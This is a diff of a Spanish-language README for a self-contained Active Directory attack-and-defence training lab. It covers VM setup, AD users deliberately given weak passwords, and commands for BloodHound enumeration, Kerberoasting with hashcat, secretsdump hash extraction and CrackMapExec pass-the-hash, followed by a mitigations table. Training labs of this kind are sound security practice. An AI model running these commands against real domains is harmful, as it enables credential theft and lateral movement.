@@ -1,131 +1,225 @@
 # Active Directory Home Lab 🏴
-
-Entorno de laboratorio virtualizado para practicar técnicas de ataque y defensa sobre Active Directory.  
-Todo ejecutado en máquinas locales — entorno 100% controlado, sin sistemas reales implicados.
-
-> ⚠️ **Disclaimer:** Este proyecto es exclusivamente educativo. Los ataques documentados se ejecutan únicamente en este entorno aislado. Nunca uses estas técnicas en sistemas sin autorización expresa.
-
+ 
+Entorno de laboratorio virtualizado para practicar técnicas de ataque y defensa sobre Active Directory.
+Montado íntegramente en local con VMware Workstation — entorno 100% aislado, sin sistemas reales implicados.
+ 
+> ⚠️ **Disclaimer:** Este proyecto es exclusivamente educativo. Todas las técnicas documentadas se ejecutan únicamente en este entorno controlado. Nunca apliques estas técnicas en sistemas sin autorización expresa y por escrito.
+ 
 ---
-
+ 
 ## 🗺️ Arquitectura del laboratorio
-
+ 
 ```
-┌─────────────────────────────────────────────────┐
-│                RED INTERNA (NAT)                │
-│                 172.16.0.0/24                   │
-│                                                 │
-│  ┌──────────────────┐    ┌───────────────────┐  │
-│  │  DC01            │    │  WS01 / WS02      │  │
-│  │  Windows Server  │    │  Windows 10       │  │
-│  │  2022            │    │  (víctimas)       │  │
-│  │  172.16.0.10     │    │  172.16.0.20/21   │  │
-│  │  AD DS · DNS     │    │                   │  │
-│  └──────────────────┘    └───────────────────┘  │
-│                                                 │
-│  ┌──────────────────┐                           │
-│  │  KALI            │                           │
-│  │  Kali Linux      │                           │
-│  │  172.16.0.100    │                           │
-│  │  (atacante)      │                           │
-│  └──────────────────┘                           │
-└─────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────┐
+│           VMnet2 — 192.168.100.0/24                  │
+│                (Host-only · Aislada)                 │
+│                                                      │
+│  ┌─────────────────────┐   ┌──────────────────────┐  │
+│  │  WIN-DC01           │   │  Kali Linux          │  │
+│  │  Windows Server 2022│   │  192.168.100.50      │  │
+│  │  192.168.100.10     │   │  (atacante)          │  │
+│  │  AD DS · DNS · DHCP │   │                      │  │
+│  └─────────────────────┘   └──────────────────────┘  │
+│                                                      │
+│  ┌──────────────────┐   ┌──────────────────────────┐ │
+│  │  WIN-PC01        │   │  WIN-PC02                │ │
+│  │  Windows 10      │   │  Windows 10              │ │
+│  │  192.168.100.101 │   │  192.168.100.102         │ │
+│  │  (víctima 1)     │   │  (víctima 2)             │ │
+│  └──────────────────┘   └──────────────────────────┘ │
+└──────────────────────────────────────────────────────┘
 ```
-
+ 
+| VM | OS | IP | RAM | Rol |
+|---|---|---|---|---|
+| WIN-DC01 | Windows Server 2022 | 192.168.100.10 | 3 GB | Domain Controller, DNS, DHCP |
+| WIN-PC01 | Windows 10 | 192.168.100.101 | 2 GB | Cliente unido al dominio |
+| WIN-PC02 | Windows 10 | 192.168.100.102 | 2 GB | Cliente unido al dominio |
+| Kali Linux | Kali Linux 2024.x | 192.168.100.50 | 2 GB | Máquina atacante |
+ 
+**Dominio:** `lab.local` · **NetBIOS:** `LAB` · **Red:** VMware Host-only (VMnet2)
+ 
 ---
-
+ 
 ## 🛠️ Requisitos
-
-- VirtualBox 7.x o VMware Workstation
-- Mínimo 16 GB RAM (recomendado)
-- ISO Windows Server 2022 (evaluación gratuita — Microsoft)
-- ISO Windows 10 (evaluación gratuita — Microsoft)
+ 
+- VMware Workstation 17+
+- ISO Windows Server 2022 Evaluation (descarga gratuita — Microsoft)
+- ISO Windows 10 Evaluation (descarga gratuita — Microsoft)
 - Kali Linux (descarga oficial — kali.org)
-
+- 12 GB RAM disponibles en el host
+ 
 ---
-
+ 
+## 👤 Usuarios del laboratorio
+ 
+| Usuario | Contraseña | Rol | Vulnerabilidad explotada |
+|---|---|---|---|
+| Administrator | P@ssw0rd123! | Domain Admin | — |
+| jsmith | Password1 | Usuario estándar | Contraseña débil |
+| mjohnson | Summer2023! | Usuario estándar | Contraseña débil |
+| svc-sql | MYpassword123# | Service Account | **Kerberoastable** (SPN registrado) |
+| localadmin | P@ssw0rd123! | Domain Admin | **Pass-the-Hash** |
+ 
+---
+ 
 ## ⚙️ Setup paso a paso
-
-### 1. Configurar el Domain Controller
-
+ 
+### Fase 1 — Domain Controller (WIN-DC01)
+ 
+#### Red — IP estática
+ 
 ```powershell
-# Instalar rol AD DS
+New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.100.10
+```
+ 
+#### Instalar y promover AD DS
+ 
+```powershell
 Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
-
-# Promover a DC
-Install-ADDSForest -DomainName "lab.local" -InstallDns
+ 
+Install-ADDSForest `
+  -DomainName "lab.local" `
+  -DomainNetbiosName "LAB" `
+  -ForestMode "WinThreshold" `
+  -DomainMode "WinThreshold" `
+  -InstallDns:$true `
+  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+  -Force:$true
 ```
-
-### 2. Crear usuarios de prueba en el dominio
-
+ 
+#### Configurar DHCP
+ 
 ```powershell
-# Usuario normal (objetivo de ataques)
-New-ADUser -Name "John Smith" -SamAccountName "jsmith" `
-  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
-  -Enabled $true
-
-# Usuario con SPN (objetivo de Kerberoasting)
-New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
-  -AccountPassword (ConvertTo-SecureString "Service123!" -AsPlainText -Force) `
-  -Enabled $true
-
-Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.lab.local:1433"}
+Install-WindowsFeature -Name DHCP -IncludeManagementTools
+Add-DhcpServerInDC -DnsName "WIN-DC01.lab.local" -IPAddress 192.168.100.10
+Add-DhcpServerv4Scope -Name "Lab Network" -StartRange 192.168.100.100 -EndRange 192.168.100.200 -SubnetMask 255.255.255.0 -State Active
+Set-DhcpServerv4OptionValue -ScopeId 192.168.100.0 -Router 192.168.100.1 -DnsServer 192.168.100.10 -DnsDomain "lab.local"
+Add-DhcpServerv4ExclusionRange -ScopeId 192.168.100.0 -StartRange 192.168.100.1 -EndRange 192.168.100.99
 ```
-
-### 3. Unir las workstations al dominio
-
+ 
+#### Crear usuarios vulnerables
+ 
 ```powershell
-Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
+# OUs
+New-ADOrganizationalUnit -Name "Lab Users" -Path "DC=lab,DC=local"
+New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=lab,DC=local"
+ 
+# Usuarios estándar
+New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@lab.local" `
+  -Path "OU=Lab Users,DC=lab,DC=local" `
+  -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+ 
+New-ADUser -Name "Mary Johnson" -SamAccountName "mjohnson" -UserPrincipalName "mjohnson@lab.local" `
+  -Path "OU=Lab Users,DC=lab,DC=local" `
+  -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+ 
+# Service account con SPN — vulnerable a Kerberoasting
+New-ADUser -Name "SQL Service" -SamAccountName "svc-sql" -UserPrincipalName "svc-sql@lab.local" `
+  -Path "OU=Service Accounts,DC=lab,DC=local" `
+  -AccountPassword (ConvertTo-SecureString "MYpassword123#" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+setspn -A MSSQLSvc/WIN-DC01.lab.local:1433 LAB\svc-sql
+setspn -A MSSQLSvc/WIN-DC01:1433 LAB\svc-sql
+ 
+# Admin de dominio — vulnerable a Pass-the-Hash
+New-ADUser -Name "Local Admin" -SamAccountName "localadmin" -UserPrincipalName "localadmin@lab.local" `
+  -Path "OU=Lab Users,DC=lab,DC=local" `
+  -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+Add-ADGroupMember -Identity "Admins. del dominio" -Members "localadmin"
 ```
-
+ 
+> 📸 **Screenshots de verificación:** `docs/screenshots/fase1-*`
+ 
 ---
-
+ 
+### Fase 2 — Clientes Windows 10 (WIN-PC01 / WIN-PC02)
+ 
+> 🔄 *En progreso*
+ 
+---
+ 
+### Fase 3 — Kali Linux (atacante)
+ 
+> 🔄 *En progreso*
+ 
+---
+ 
 ## ⚔️ Ataques documentados
-
+ 
 | Técnica | Herramienta | Estado |
-|---------|-------------|--------|
-| Enumeración AD | BloodHound + SharpHound | ✅ Documentado |
-| Kerberoasting | Impacket / Rubeus | ✅ Documentado |
-| Pass-the-Hash | CrackMapExec | 🔄 En progreso |
-| AS-REP Roasting | Impacket | 📋 Pendiente |
+|---|---|---|
+| Enumeración AD | BloodHound + bloodhound-python | 📋 Pendiente |
+| Kerberoasting | Impacket GetUserSPNs + hashcat | 📋 Pendiente |
+| Pass-the-Hash | CrackMapExec + Impacket | 📋 Pendiente |
+| AS-REP Roasting | Impacket GetNPUsers | 📋 Pendiente |
 | DCSync | Impacket secretsdump | 📋 Pendiente |
-
+ 
 ---
-
+ 
 ### 🔍 Enumeración con BloodHound
-
+ 
+> 📋 *Documentación pendiente — Fase 3*
+ 
 ```bash
-# Desde Kali — recopilar datos del dominio
-bloodhound-python -u jsmith -p 'Password123!' -d lab.local -ns 172.16.0.10 -c all
-
+# Recopilar datos del dominio desde Kali
+bloodhound-python -u jsmith -p 'Password1' -d lab.local -ns 192.168.100.10 -c all
+ 
 # Iniciar Neo4j y BloodHound
 sudo neo4j start
 bloodhound
 ```
-
+ 
+---
+ 
 ### 🎯 Kerberoasting
-
+ 
+> 📋 *Documentación pendiente — Fase 3*
+ 
 ```bash
-# Solicitar tickets de servicios con SPN
-impacket-GetUserSPNs lab.local/jsmith:'Password123!' -dc-ip 172.16.0.10 -request
-
-# Crackear el hash con hashcat
-hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+# Solicitar TGS de cuentas con SPN registrado
+impacket-GetUserSPNs lab.local/jsmith:'Password1' -dc-ip 192.168.100.10 -request -outputfile kerberoast.hash
+ 
+# Crackear el hash
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
 ```
-
+ 
 ---
-
+ 
+### 🔑 Pass-the-Hash
+ 
+> 📋 *Documentación pendiente — Fase 3*
+ 
+```bash
+# Extraer hash NTLM
+impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
+ 
+# Autenticarse con el hash sin necesidad de contraseña
+crackmapexec smb 192.168.100.0/24 -u localadmin -H <NTLM_HASH>
+```
+ 
+---
+ 
 ## 🛡️ Mitigaciones
-
-Cada técnica documentada incluye su contramedida:
-
-- **Kerberoasting** → contraseñas de cuentas de servicio largas (+25 caracteres) y uso de gMSA
-- **Pass-the-Hash** → deshabilitar NTLM donde sea posible, activar Credential Guard
-- **BloodHound / enumeración** → principio de mínimo privilegio, revisar ACLs del dominio
-
+ 
+| Ataque | Mitigación |
+|---|---|
+| Kerberoasting | Contraseñas +25 caracteres en service accounts · Usar Group Managed Service Accounts (gMSA) |
+| Pass-the-Hash | Deshabilitar NTLM donde sea posible · Activar Windows Defender Credential Guard |
+| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio regularmente |
+| AS-REP Roasting | Forzar pre-autenticación Kerberos en todos los usuarios |
+| DCSync | Restringir permisos de replicación de directorio (solo DCs reales) |
+ 
 ---
-
+ 
 ## 📚 Referencias
-
-- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
-- [SpecterOps — BloodHound](https://bloodhoundad.com)
+ 
+- [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
+- [BloodHound Documentation](https://bloodhound.readthedocs.io)
 - [Impacket — GitHub](https://github.com/fortra/impacket)
+- [PayloadsAllTheThings — AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
+- [TarlogicSecurity — Kerberos Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
